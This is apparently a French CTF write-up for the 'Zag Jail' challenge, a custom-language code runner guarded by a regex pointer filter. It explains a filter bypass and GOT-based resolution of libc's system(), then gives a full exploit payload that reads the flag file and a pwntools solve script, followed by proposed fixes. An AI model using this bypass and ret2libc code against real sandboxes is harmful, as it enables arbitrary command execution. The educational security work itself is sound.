# Zag Jail - Write-up detaille

## 1. Enonce et objectif

On interagit avec un service qui :
1. lit un programme Zag envoye par l'utilisateur,
2. applique un filtre Python (`server.py`) cense bloquer les abus pointeurs,
3. compile le code avec `zag`,
4. execute le binaire genere.

Le but est de lire le flag.

Flag obtenu :

```text
gigem{custom_language_but_still_links_to_libc_:thinking:_jk_thanks_for_the_cool_language}
```

## 2. Ce que fait reellement la sandbox

Le serveur applique une validation statique basee sur regex dans `check_pointer_safety`.
Regles affichees :
- `extern` interdit,
- arithmetique explicite sur pointeur interdite (`p + N`, `p - N`),
- acces hors bornes interdit.

Important : ce n'est pas un vrai parseur Zag, c'est un suivi partiel de motifs texte.

Le filtre tracke des pointeurs avec des patterns comme :
- `var p: *T = &arr[i]`
- `var p: *T = &arr`
- `p = &arr[i]`
- `*p`, `p[i]`, etc.

Mais ce suivi est fragile car il depend d'expressions regex tres specifiques.

## 3. Faiblesses exploitables du filtre

### 3.1 Contournement de la detection de `*nom`

Le token deref est detecte avec `DEREF = \*(\w+)`.
Si on ecrit :

```zag
var pfn: * fn(*u8) i32;
```

la sous-chaine `* fn` (avec espace) n'est pas reconnue comme `*nom`.
Donc le filtre ne bloque pas alors que le compilateur Zag accepte ce type.

### 3.2 Casts de pointeurs permissifs du compilateur Zag

Dans le compilateur (version du challenge), `assign_type_cmp` retourne `true` pour tous les pointeurs :
- on peut affecter `*u64` vers `*fn(...)` sans contrainte stricte.

Ca permet de forger un pointeur de fonction depuis une adresse brute.

### 3.3 Appel indirect autorise

Le backend x86_64 fait :
- appel direct si la valeur est un symbole fonction,
- sinon `call rax` (appel indirect) si c'est une valeur de type fonction non symbole.

Donc si on place l'adresse de `system` dans une variable puis qu'on la reinterprette en `fn(*u8) i32`, on peut l'appeler.

## 4. Strategie d'exploitation

Comme `extern` est interdit, on ne peut pas declarer `system` proprement.
On fait donc une resolution manuelle d'adresse :

1. Recuperer l'adresse runtime de `main`.
2. Calculer l'adresse d'une entree GOT (`__libc_start_main`) via offset connu relatif a `main`.
3. Lire le contenu de cette entree GOT => adresse reelle de `__libc_start_main` dans libc.
4. Calculer la base libc.
5. Ajouter l'offset de `system`.
6. Forger un pointeur de fonction vers `system`.
7. Appeler `system("/bin/cat /app/flag.txt")`.

## 5. Offsets utilises

Mesures sur l'environnement du challenge :
- `got_delta = 11927` (distance entre `main` et GOT `__libc_start_main`),
- `__libc_start_main` offset libc = `171232` (`0x29ce0`),
- `system` offset libc = `340240` (`0x53110`).

## 6. Particularite : tableau local inverse sur pile

Le compilateur range les elements d'un tableau local de facon inversee en memoire (vu depuis `&cmd`) par rapport a l'initialiseur.

Pour obtenir en memoire :

```text
/bin/cat /app/flag.txt\x00
```

il faut declarer le tableau inverse.

## 7. Payload final Zag

```zag
fn main() i32 {
    var cmd = []u8{0,'t','x','t','.','g','a','l','f','/','p','p','a','/',' ','t','a','c','/','n','i','b','/'};

    var f: fn() i32 = main;
    var pf: * fn() i32 = & f;
    var pu: *u64;
    pu = (pf);
    var main_addr: u64 = *(pu);

    var got_delta: u64 = 11927;
    var got_addr: u64 = main_addr + got_delta;

    var got_cell: u64 = got_addr;
    var got_cell_p: *u64 = & got_cell;
    var got_pp: **u64;
    got_pp = (got_cell_p);
    var got_ptr: *u64 = *(got_pp);

    var libc_start_main_addr: u64 = *(got_ptr);

    var libc_start_main_off: u64 = 171232;
    var libc_base: u64 = libc_start_main_addr - libc_start_main_off;
    var system_off: u64 = 340240;
    var system_addr: u64 = libc_base + system_off;

    var cell: u64 = system_addr;
    var pcell: *u64 = & cell;
    var pfn: * fn(*u8) i32;
    pfn = (pcell);
    var system_fn: fn(*u8) i32 = *(pfn);

    var cmdp: *u8 = & cmd;
    return system_fn(cmdp);
}
```

## 8. Script solve (pwntools)

```python
from pwn import *

io = remote("streams.tamuctf.com", 443, ssl=True, sni="zagjail")
payload = open("exploit.zag", "rb").read()

io.recvuntil(b"===\n")
io.send(payload + b"\n<EOF>\n")
print(io.recvall(timeout=10).decode(errors="ignore"))
```

## 9. Pourquoi ca marche

Les regles portent sur une interpretation regex incomplete du code.
On contourne le tracking statique, puis on exploite la permissivite des casts pointeurs du compilateur, puis on reutilise libc via GOT.

## 10. Correctifs possibles

1. Remplacer les regex par une vraie analyse AST.
2. Interdire les casts implicites entre types pointeurs incompatibles.
3. Bloquer les appels indirects vers pointeurs forges.
4. Ajouter une sandbox runtime (seccomp/allowlist syscalls).
5. Eviter les chemins de flag triviaux (ex: `/app/flag.txt`).
